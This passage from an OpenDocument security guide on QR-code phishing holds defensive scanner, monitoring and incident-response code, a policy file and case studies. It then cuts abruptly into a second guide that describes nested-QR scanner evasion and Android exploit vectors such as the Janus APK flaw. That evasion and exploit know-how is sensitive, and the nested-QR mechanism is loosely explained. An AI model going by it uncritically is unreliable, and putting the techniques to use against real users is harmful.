text:c="15"/>"data": qr_data[:100] + ("..." if len(qr_data) &gt; 100 else ""),<text:line-break/> <text:s text:c="15"/>"security": {"is_safe": True, "warnings": ["Non-URL content - manual review recommended"]}<text:line-break/> <text:s text:c="11"/>}<text:line-break/><text:line-break/># Usage<text:line-break/>scanner = SecureQRScanner()<text:line-break/>result = scanner.scan_qr("suspicious_qr.png")<text:line-break/>print(json.dumps(result, indent=2))</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Defense Layer 2: Enterprise QR Code Management</text:h>
      <text:p text:style-name="P1"># qr_security_policy.yaml<text:line-break/># Corporate QR Code Security Policy<text:line-break/><text:line-break/>policies:<text:line-break/> <text:s/>- name: "QR Code Generation"<text:line-break/> <text:s text:c="3"/>rules:<text:line-break/> <text:s text:c="5"/>- "All internal QR codes must be generated by IT department"<text:line-break/> <text:s text:c="5"/>- "QR codes must include visible tracking ID"<text:line-break/> <text:s text:c="5"/>- "Expiry date encoded in QR metadata"<text:line-break/> <text:s text:c="5"/>- "Digital signature attached to QR content"<text:line-break/> <text:s/><text:line-break/> <text:s/>- name: "QR Code Scanning"<text:line-break/> <text:s text:c="3"/>rules:<text:line-break/> <text:s text:c="5"/>- "Company devices must use approved QR scanner with security features"<text:line-break/> <text:s text:c="5"/>- "URLs from QR codes go through proxy for inspection"<text:line-break/> <text:s text:c="5"/>- "Suspicious QR codes trigger security alert"<text:line-break/> <text:s text:c="5"/>- "Block QR codes pointing to non-corporate domains"<text:line-break/> <text:s/><text:line-break/> <text:s/>- name: "Incident Response"<text:line-break/> <text:s text:c="3"/>rules:<text:line-break/><text:soft-page-break/> <text:s text:c="5"/>- "Report any suspicious QR codes to security team"<text:line-break/> <text:s text:c="5"/>- "Remove/physical cover suspicious QR codes immediately"<text:line-break/> <text:s text:c="5"/>- "Log all QR scan events for audit"<text:line-break/> <text:s text:c="5"/>- "Regular awareness training on QR risks"<text:line-break/><text:line-break/>implementation:<text:line-break/> <text:s/>technical_controls:<text:line-break/> <text:s text:c="3"/>- "Deploy MDM with QR scanning restrictions"<text:line-break/> <text:s text:c="3"/>- "Configure web proxy to block known phishing domains"<text:line-break/> <text:s text:c="3"/>- "Enable QR code detection in email security gateway"<text:line-break/> <text:s text:c="3"/>- "Use browser extension that warns about QR-opened URLs"</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Defense Layer 3: Real-time QR Monitoring Dashboard</text:h>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># qr_monitoring_dashboard.py<text:line-break/><text:line-break/>import asyncio<text:line-break/>import websockets<text:line-break/>import json<text:line-break/>from datetime import datetime<text:line-break/>import sqlite3<text:line-break/><text:line-break/>class QRMonitoringSystem:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Enterprise QR code monitoring and alerting<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.db = sqlite3.connect('qr_security.db')<text:line-break/> <text:s text:c="7"/>self.init_db()<text:line-break/> <text:s text:c="7"/>self.alerts = []<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def init_db(self):<text:line-break/> <text:s text:c="7"/>cursor = self.db.cursor()<text:line-break/> <text:s text:c="7"/>cursor.execute('''<text:line-break/> <text:s text:c="11"/>CREATE TABLE IF NOT EXISTS qr_scans (<text:line-break/> <text:s text:c="15"/>id INTEGER PRIMARY KEY,<text:line-break/> <text:s text:c="15"/>timestamp DATETIME,<text:line-break/> <text:s text:c="15"/>user_id TEXT,<text:line-break/> <text:s text:c="15"/>qr_content TEXT,<text:line-break/> <text:s text:c="15"/>risk_score INTEGER,<text:line-break/> <text:s text:c="15"/>action_taken TEXT,<text:line-break/> <text:s text:c="15"/>location TEXT<text:line-break/> <text:s text:c="11"/>)<text:line-break/> <text:s text:c="7"/>''')<text:line-break/> <text:s text:c="7"/>cursor.execute('''<text:line-break/> <text:s text:c="11"/>CREATE TABLE IF NOT EXISTS qr_alerts (<text:line-break/> <text:s text:c="15"/>id INTEGER PRIMARY KEY,<text:line-break/> <text:s text:c="15"/>timestamp DATETIME,<text:line-break/> <text:s text:c="15"/>alert_type TEXT,<text:line-break/> <text:s text:c="15"/>severity TEXT,<text:line-break/> <text:s text:c="15"/>details TEXT,<text:line-break/> <text:s text:c="15"/>resolved BOOLEAN<text:line-break/> <text:s text:c="11"/>)<text:line-break/> <text:s text:c="7"/>''')<text:line-break/> <text:s text:c="7"/>self.db.commit()<text:line-break/> <text:s text:c="3"/><text:line-break/><text:soft-page-break/> <text:s text:c="3"/>def log_scan(self, user_id, qr_content, risk_score, action, location):<text:line-break/> <text:s text:c="7"/>cursor = self.db.cursor()<text:line-break/> <text:s text:c="7"/>cursor.execute('''<text:line-break/> <text:s text:c="11"/>INSERT INTO qr_scans (timestamp, user_id, qr_content, risk_score, action_taken, location)<text:line-break/> <text:s text:c="11"/>VALUES (?, ?, ?, ?, ?, ?)<text:line-break/> <text:s text:c="7"/>''', (datetime.now(), user_id, qr_content[:500], risk_score, action, location))<text:line-break/> <text:s text:c="7"/>self.db.commit()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Generate alert for high-risk scans<text:line-break/> <text:s text:c="7"/>if risk_score &gt;= 70:<text:line-break/> <text:s text:c="11"/>self.create_alert("HIGH_RISK_SCAN", "CRITICAL", <text:line-break/> <text:s text:c="28"/>f"User {user_id} scanned high-risk QR at {location}")<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def create_alert(self, alert_type, severity, details):<text:line-break/> <text:s text:c="7"/>alert = {<text:line-break/> <text:s text:c="11"/>"timestamp": datetime.now().isoformat(),<text:line-break/> <text:s text:c="11"/>"type": alert_type,<text:line-break/> <text:s text:c="11"/>"severity": severity,<text:line-break/> <text:s text:c="11"/>"details": details,<text:line-break/> <text:s text:c="11"/>"resolved": False<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/>self.alerts.append(alert)<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Store in database<text:line-break/> <text:s text:c="7"/>cursor = self.db.cursor()<text:line-break/> <text:s text:c="7"/>cursor.execute('''<text:line-break/> <text:s text:c="11"/>INSERT INTO qr_alerts (timestamp, alert_type, severity, details, resolved)<text:line-break/> <text:s text:c="11"/>VALUES (?, ?, ?, ?, ?)<text:line-break/> <text:s text:c="7"/>''', (datetime.now(), alert_type, severity, details, False))<text:line-break/> <text:s text:c="7"/>self.db.commit()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/># Send real-time notification<text:line-break/> <text:s text:c="7"/>self.send_alert_notification(alert)<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def send_alert_notification(self, alert):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Send alerts to security team<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/># Example: Webhook to Slack<text:line-break/> <text:s text:c="7"/>import requests<text:line-break/> <text:s text:c="7"/>webhook_url = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>message = {<text:line-break/> <text:s text:c="11"/>"text": f"🚨 QR Security Alert 🚨\n"<text:line-break/> <text:s text:c="19"/>f"Type: {alert['type']}\n"<text:line-break/> <text:s text:c="19"/>f"Severity: {alert['severity']}\n"<text:line-break/> <text:s text:c="19"/>f"Time: {alert['timestamp']}\n"<text:line-break/> <text:s text:c="19"/>f"Details: {alert['details']}"<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>try:<text:line-break/> <text:s text:c="11"/>requests.post(webhook_url, json=message)<text:line-break/> <text:s text:c="7"/>except:<text:line-break/> <text:s text:c="11"/>pass <text:s/># Log failure<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def generate_report(self, time_period_days=7):<text:line-break/><text:soft-page-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Generate security report<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>cursor = self.db.cursor()<text:line-break/> <text:s text:c="7"/>cursor.execute('''<text:line-break/> <text:s text:c="11"/>SELECT COUNT(*) as total_scans,<text:line-break/> <text:s text:c="18"/>AVG(risk_score) as avg_risk,<text:line-break/> <text:s text:c="18"/>COUNT(CASE WHEN risk_score &gt;= 70 THEN 1 END) as high_risk_scans<text:line-break/> <text:s text:c="11"/>FROM qr_scans<text:line-break/> <text:s text:c="11"/>WHERE timestamp &gt; datetime('now', ?)<text:line-break/> <text:s text:c="7"/>''', (f'-{time_period_days} days',))<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>results = cursor.fetchone()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>report = {<text:line-break/> <text:s text:c="11"/>"period_days": time_period_days,<text:line-break/> <text:s text:c="11"/>"total_scans": results[0],<text:line-break/> <text:s text:c="11"/>"average_risk_score": round(results[1] or 0, 2),<text:line-break/> <text:s text:c="11"/>"high_risk_incidents": results[2] or 0,<text:line-break/> <text:s text:c="11"/>"open_alerts": len([a for a in self.alerts if not a['resolved']])<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return report<text:line-break/><text:line-break/># Dashboard class to visualize<text:line-break/>class QRDashboard:<text:line-break/> <text:s text:c="3"/>def __init__(self, monitor):<text:line-break/> <text:s text:c="7"/>self.monitor = monitor<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def display(self):<text:line-break/> <text:s text:c="7"/>report = self.monitor.generate_report()<text:line-break/> <text:s text:c="7"/>print("""<text:line-break/> <text:s text:c="7"/>╔══════════════════════════════════════════════════════╗<text:line-break/> <text:s text:c="7"/>║ <text:s text:c="10"/>QR CODE SECURITY DASHBOARD <text:s text:c="16"/>║<text:line-break/> <text:s text:c="7"/>╠══════════════════════════════════════════════════════╣<text:line-break/> <text:s text:c="7"/>║ <text:s/>Total Scans (7 days): <text:s text:c="3"/>{total_scans:&lt;10} <text:s text:c="9"/>║<text:line-break/> <text:s text:c="7"/>║ <text:s/>Average Risk Score: <text:s text:c="5"/>{avg_risk:&lt;10} <text:s text:c="13"/>║<text:line-break/> <text:s text:c="7"/>║ <text:s/>High Risk Incidents: <text:s text:c="4"/>{high_risk:&lt;10} <text:s text:c="12"/>║<text:line-break/> <text:s text:c="7"/>║ <text:s/>Open Security Alerts: <text:s text:c="3"/>{alerts:&lt;10} <text:s text:c="15"/>║<text:line-break/> <text:s text:c="7"/>╚══════════════════════════════════════════════════════╝<text:line-break/> <text:s text:c="7"/>""".format(**{<text:line-break/> <text:s text:c="11"/>'total_scans': report['total_scans'],<text:line-break/> <text:s text:c="11"/>'avg_risk': report['average_risk_score'],<text:line-break/> <text:s text:c="11"/>'high_risk': report['high_risk_incidents'],<text:line-break/> <text:s text:c="11"/>'alerts': report['open_alerts']<text:line-break/> <text:s text:c="7"/>}))<text:line-break/><text:line-break/># Usage<text:line-break/>monitor = QRMonitoringSystem()<text:line-break/>dashboard = QRDashboard(monitor)<text:line-break/>dashboard.display()</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>📊 Part 5: Detection &amp; Response Playbook</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Incident Response for QR Attacks</text:h>
      <text:p text:style-name="P1">#!/usr/bin/env python3<text:line-break/># qr_incident_response.py<text:line-break/><text:line-break/>class QRIncidentResponse:<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/>Incident response procedures for QR-based attacks<text:line-break/> <text:s text:c="3"/>"""<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def __init__(self):<text:line-break/> <text:s text:c="7"/>self.response_phases = {<text:line-break/> <text:s text:c="11"/>"1_detection": self.detection_phase,<text:line-break/> <text:s text:c="11"/>"2_containment": self.containment_phase,<text:line-break/> <text:s text:c="11"/>"3_eradication": self.eradication_phase,<text:line-break/> <text:s text:c="11"/>"4_recovery": self.recovery_phase,<text:line-break/> <text:s text:c="11"/>"5_lessons": self.lessons_learned<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def detection_phase(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Identify that a QR attack has occurred<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>indicators = {<text:line-break/> <text:s text:c="11"/>"user_report": "Employee reported suspicious QR",<text:line-break/> <text:s text:c="11"/>"security_alert": "Automated system detected malicious QR",<text:line-break/> <text:s text:c="11"/>"anomalous_login": "Login from unusual location after QR scan",<text:line-break/> <text:s text:c="11"/>"malware_detected": "AV detected payload from QR download"<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print(f"🔍 DETECTION PHASE")<text:line-break/> <text:s text:c="7"/>print(f" <text:s text:c="2"/>Indicator: {indicators.get(incident['indicator'])}")<text:line-break/> <text:s text:c="7"/>print(f" <text:s text:c="2"/>Time: {incident['timestamp']}")<text:line-break/> <text:s text:c="7"/>print(f" <text:s text:c="2"/>Affected: {incident['affected_user']}")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return {<text:line-break/> <text:s text:c="11"/>"status": "INVESTIGATING",<text:line-break/> <text:s text:c="11"/>"confirmed": True,<text:line-break/> <text:s text:c="11"/>"scope": incident.get('scope', 'unknown')<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def containment_phase(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Stop the attack from spreading<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>actions = [<text:line-break/> <text:s text:c="11"/>"Isolate affected device from network",<text:line-break/> <text:s text:c="11"/>"Block domain/IP from QR code",<text:line-break/> <text:s text:c="11"/>"Remove/cover physical QR code if applicable",<text:line-break/> <text:s text:c="11"/>"Reset affected user's passwords",<text:line-break/> <text:s text:c="11"/>"Revoke session tokens"<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print(f"🛡️ CONTAINMENT PHASE")<text:line-break/> <text:s text:c="7"/>for action in actions:<text:line-break/> <text:s text:c="11"/>print(f" <text:s text:c="2"/>✓ {action}")<text:line-break/> <text:s text:c="11"/># Execute containment action<text:line-break/><text:soft-page-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return {"contained": True, "actions_taken": len(actions)}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def eradication_phase(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Remove the threat completely<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>actions = [<text:line-break/> <text:s text:c="11"/>"Run full antivirus scan on affected device",<text:line-break/> <text:s text:c="11"/>"Remove malicious files/applications",<text:line-break/> <text:s text:c="11"/>"Audit user account for unauthorized access",<text:line-break/> <text:s text:c="11"/>"Check for persistence mechanisms",<text:line-break/> <text:s text:c="11"/>"Update blocklists with new threat indicators"<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print(f"🧹 ERADICATION PHASE")<text:line-break/> <text:s text:c="7"/>for action in actions:<text:line-break/> <text:s text:c="11"/>print(f" <text:s text:c="2"/>✓ {action}")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return {"eradicated": True}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def recovery_phase(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Return systems to normal operation<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>actions = [<text:line-break/> <text:s text:c="11"/>"Restore device from clean backup if needed",<text:line-break/> <text:s text:c="11"/>"Reconnect device to network",<text:line-break/> <text:s text:c="11"/>"Monitor for recurrence",<text:line-break/> <text:s text:c="11"/>"Provide security awareness briefing to affected user",<text:line-break/> <text:s text:c="11"/>"Update security policies if needed"<text:line-break/> <text:s text:c="7"/>]<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print(f"🔄 RECOVERY PHASE")<text:line-break/> <text:s text:c="7"/>for action in actions:<text:line-break/> <text:s text:c="11"/>print(f" <text:s text:c="2"/>✓ {action}")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return {"recovered": True}<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def lessons_learned(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Document and improve<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>report = {<text:line-break/> <text:s text:c="11"/>"incident_summary": {<text:line-break/> <text:s text:c="15"/>"type": "QR-based attack",<text:line-break/> <text:s text:c="15"/>"detection_method": incident.get('indicator'),<text:line-break/> <text:s text:c="15"/>"response_time_minutes": incident.get('response_time', 0),<text:line-break/> <text:s text:c="15"/>"impact_assessment": incident.get('impact', 'unknown')<text:line-break/> <text:s text:c="11"/>},<text:line-break/> <text:s text:c="11"/>"improvements": [<text:line-break/> <text:s text:c="15"/>"Enhance QR scanning security features",<text:line-break/> <text:s text:c="15"/>"Increase user awareness training",<text:line-break/> <text:s text:c="15"/>"Implement QR allowlisting",<text:line-break/> <text:s text:c="15"/>"Deploy QR monitoring dashboard",<text:line-break/> <text:s text:c="15"/>"Update incident response playbook"<text:line-break/> <text:s text:c="11"/>],<text:line-break/> <text:s text:c="11"/>"metrics": {<text:line-break/> <text:s text:c="15"/>"time_to_detect": 5,<text:line-break/><text:soft-page-break/> <text:s text:c="15"/>"time_to_contain": 15,<text:line-break/> <text:s text:c="15"/>"time_to_eradicate": 30,<text:line-break/> <text:s text:c="15"/>"time_to_recover": 60<text:line-break/> <text:s text:c="11"/>}<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>print(f"📚 LESSONS LEARNED")<text:line-break/> <text:s text:c="7"/>print(json.dumps(report, indent=2))<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return report<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>def execute_playbook(self, incident):<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>Run full incident response<text:line-break/> <text:s text:c="7"/>"""<text:line-break/> <text:s text:c="7"/>print("\n" + "="*60)<text:line-break/> <text:s text:c="7"/>print("🚨 QR INCIDENT RESPONSE PLAYBOOK EXECUTED 🚨")<text:line-break/> <text:s text:c="7"/>print("="*60 + "\n")<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>results = {}<text:line-break/> <text:s text:c="7"/>for phase_name, phase_func in self.response_phases.items():<text:line-break/> <text:s text:c="11"/>results[phase_name] = phase_func(incident)<text:line-break/> <text:s text:c="11"/>print()<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>return results<text:line-break/><text:line-break/># Simulated incident<text:line-break/>incident = {<text:line-break/> <text:s text:c="3"/>"indicator": "security_alert",<text:line-break/> <text:s text:c="3"/>"timestamp": "2025-06-07 14:30:00",<text:line-break/> <text:s text:c="3"/>"affected_user": "employee@company.com",<text:line-break/> <text:s text:c="3"/>"scope": "single_device",<text:line-break/> <text:s text:c="3"/>"impact": "credentials_compromised",<text:line-break/> <text:s text:c="3"/>"response_time": 5<text:line-break/>}<text:line-break/><text:line-break/>response = QRIncidentResponse()<text:line-break/>response.execute_playbook(incident)</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📚 Part 6: Case Studies</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Case Study 1: Major Quishing Campaign (2024)</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Background:</text:span> Attackers placed QR stickers on parking meters in 3 major US cities</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">How it worked:</text:span></text:p>
      <text:p text:style-name="P1">Attack Chain:<text:line-break/> <text:s/>1. Physical stickers placed over legitimate parking payment QR codes<text:line-break/> <text:s/>2. Stickers led to fake payment portal<text:line-break/> <text:s/>3. Portal captured:<text:line-break/> <text:s text:c="4"/>- Credit card numbers<text:line-break/> <text:s text:c="4"/>- Parking meter location<text:line-break/> <text:s text:c="4"/>- Vehicle license plate (user entered)<text:line-break/> <text:s/>4. Collected data used for financial fraud<text:line-break/> <text:s/>5. Estimated loss: $500,000+ before detection<text:line-break/><text:soft-page-break/><text:line-break/>Detection: <text:line-break/> <text:s/>- User reported payment failure to parking authority<text:line-break/> <text:s/>- Manual inspection found tampered QR codes<text:line-break/><text:line-break/>Response:<text:line-break/> <text:s/>- All meters inspected<text:line-break/> <text:s/>- QR codes replaced with tamper-evident labels<text:line-break/> <text:s/>- Official parking app promoted over QR payment</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Case Study 2: Corporate Spear-Phishing via QR</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Background:</text:span> Attackers targeted a mid-sized tech company</text:p>
      <text:p text:style-name="P1"># Reconstruction of attack<text:line-break/>attack_reconstruction = {<text:line-break/> <text:s text:c="3"/>"initial_vector": "Email with QR code claiming to be HR benefits update",<text:line-break/> <text:s text:c="3"/>"target": "Finance department employees",<text:line-break/> <text:s text:c="3"/>"payload": "Credential harvester for Office 365",<text:line-break/> <text:s text:c="3"/>"bypass": "QR code bypassed email URL filters",<text:line-break/> <text:s text:c="3"/>"result": "12 compromised accounts, $200,000 wire fraud",<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>"lessons_learned": [<text:line-break/> <text:s text:c="7"/>"QR codes in email must be blocked or rendered unsafe",<text:line-break/> <text:s text:c="7"/>"MFA alone insufficient - session tokens still stolen",<text:line-break/> <text:s text:c="7"/>"Need QR-aware email security"<text:line-break/> <text:s text:c="3"/>]<text:line-break/>}</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔧 Part 7: Tool Development for Security Teams</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Custom QR Security Scanner CLI Tool</text:h>
      <text:p text:style-name="P1">#!/bin/bash<text:line-break/># qr_security_scanner_cli.sh<text:line-break/><text:line-break/>GREEN='\033[0;32m'<text:line-break/>RED='\033[0;31m'<text:line-break/>YELLOW='\033[1;33m'<text:line-break/>NC='\033[0m'<text:line-break/><text:line-break/>show_banner() {<text:line-break/> echo "┌────────────────────────────────────────────┐"<text:line-break/> echo "│ <text:s text:c="8"/>QR SECURITY SCANNER v1.0 <text:s text:c="9"/>│"<text:line-break/> echo "│ <text:s text:c="5"/>Enterprise Security Edition <text:s text:c="9"/>│"<text:line-break/> echo "└────────────────────────────────────────────┘"<text:line-break/>}<text:line-break/><text:line-break/>check_dependencies() {<text:line-break/> deps=("zbarimg" "curl" "jq" "python3")<text:line-break/> for dep in "${deps[@]}"; do<text:line-break/> if ! command -v $dep &amp;&gt; /dev/null; then<text:line-break/> echo -e "${RED}[!] Missing: $dep${NC}"<text:line-break/> exit 1<text:line-break/> fi<text:line-break/><text:soft-page-break/> <text:s text:c="3"/>done<text:line-break/>}<text:line-break/><text:line-break/>scan_qr() {<text:line-break/> <text:s text:c="3"/>local qr_file=$1<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>echo -e "${YELLOW}[*] Scanning QR code...${NC}"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/># Extract URL from QR<text:line-break/> <text:s text:c="3"/>URL=$(zbarimg -q $qr_file)<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>if [ -z "$URL" ]; then<text:line-break/> <text:s text:c="7"/>echo -e "${RED}[!] No QR code found or failed to decode${NC}"<text:line-break/> <text:s text:c="7"/>return 1<text:line-break/> <text:s text:c="3"/>fi<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>echo -e "${GREEN}[+] Extracted: $URL${NC}"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/># Check domain reputation<text:line-break/> <text:s text:c="3"/>DOMAIN=$(echo $URL | awk -F/ '{print $3}')<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>echo -</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">⚡ QR CODE INCEPTION &amp; ANDROID EXPLOITS — THE ULTIMATE GUIDE</text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Yes, Attackers Can Put QR Codes Inside Other QR Codes</text:h>
      <text:p text:style-name="Text_20_body">The answer is <text:span text:style-name="T1">yes</text:span>, and security researchers have documented this technique being actively used by phishing gangs like <text:span text:style-name="T1">Tycoon 2FA PhaaS</text:span>.</text:p>
      <text:p text:style-name="Text_20_body">This technique is officially called <text:span text:style-name="T1">"Nested QR Codes"</text:span> or <text:span text:style-name="T1">QR-in-QR</text:span>.</text:p>
      <text:p text:style-name="Text_20_body">Here is how the visual deception works:</text:p>
      <text:p text:style-name="P1">┌─────────────────────────────────────┐<text:line-break/>│ <text:s/>██████████████████████████████████ │<text:line-break/>│ <text:s/>██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██ │<text:line-break/>│ <text:s/>██░░┌─────────────────────┐░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s text:c="2"/>OUTER QR CODE <text:s text:c="4"/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s text:c="20"/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s/>┌───────────────┐ <text:s/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s/>│ <text:s/>INNER QR <text:s text:c="4"/>│ <text:s/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s/>│ <text:s/>(Legitimate) │ <text:s/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s/>└───────────────┘ <text:s/>│░░██ │<text:line-break/>│ <text:s/>██░░│ <text:s text:c="20"/>│░░██ │<text:line-break/>│ <text:s/>██░░└─────────────────────┘░░██ │<text:line-break/>│ <text:s/>██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██ │<text:line-break/>│ <text:s/>██████████████████████████████████ │<text:line-break/><text:soft-page-break/>└─────────────────────────────────────┘</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">How the Nested QR Attack Works</text:h>
      <text:p text:style-name="Text_20_body">The <text:span text:style-name="T1">inner QR code</text:span> points to a legitimate site (like <text:span text:style-name="T2">https://google.com</text:span>), causing basic security scanners to mark it as safe.</text:p>
      <text:p text:style-name="Text_20_body">The <text:span text:style-name="T1">outer QR code</text:span> is malicious. When a human scans it, the QR reader must decide which code to interpret. Attackers manipulate the timing and spacing so that the malicious outer code is read first.</text:p>
      <text:p text:style-name="Text_20_body">Security scanners see two codes and get confused by "mixed signals," often giving up and marking the image as clean.</text:p>
      <text:p text:style-name="Text_20_body">This technique has been observed with the <text:span text:style-name="T1">Gabagool phishing kit</text:span> (using split QR codes) and the <text:span text:style-name="T1">Tycoon kit</text:span> (using nested QR codes).</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📱 ANDROID EXPLOITS — DEEP DIVE</text:h>
      <text:p text:style-name="Text_20_body">Android devices are primary targets for QR attacks because scanning a QR code often means leaving the corporate security perimeter. Here are the major exploit vectors:</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">1. The Janus Vulnerability (CVE-2017-13156)</text:h>
      <text:p text:style-name="Text_20_body">This affects Android 5.0 to 8.0. Attackers modify an APK's signature block to add malicious code without breaking the original signature.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Real-World Example:</text:span> In 2025, threat actors distributed trojanized Telegram APKs via fake websites reached through QR codes. The malware used the Janus exploit to bypass signature verification.</text:p>
      <text:p text:style-name="Text_20_body">Once installed, it used Android's MediaPlayer component to trigger background activity unnoticed.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2. Samsung Smart Switch Exploit Chain (Advanced)</text:h>
      <text:p text:style-name="Text_20_body">Security researchers discovered a critical chain allowing complete device compromise via QR codes.</text:p>
